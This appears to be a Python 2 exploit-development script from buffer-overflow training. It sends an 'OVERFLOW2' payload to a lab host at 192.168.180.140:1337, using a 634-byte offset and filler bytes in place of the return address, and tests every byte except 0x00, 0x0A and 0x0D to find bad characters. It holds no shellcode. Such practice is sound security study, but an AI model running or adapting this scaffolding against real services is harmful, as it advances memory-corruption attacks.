import sys, socket
from time import sleep

RHOST="192.168.180.140"
RPORT=1337

OFFSET=634
NO_B=4
NO_C=4
NO_Z=8


def connect(DATA):
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect((RHOST, RPORT))
        s.send(("OVERFLOW2 " + DATA + "\r\n"))
        s.close()
        print ("Sent: {}".format(DATA))

BUFT = 1000

BADCHARS = [0x00, 0x0A, 0x0D]

badchar_test = ""

for i in range(0x00, 0xFF+1):
       if i not in BADCHARS:
               badchar_test += chr(i)

with open("bad.bin", "wb") as f:
       f.write(badchar_test)


buf = ""
buf += "A"*(OFFSET - len(buf))
buf += "B"*NO_B
buf += "Z"*NO_Z
buf += badchar_test
buf += "D"*(BUFT - len(buf))

connect(buf)
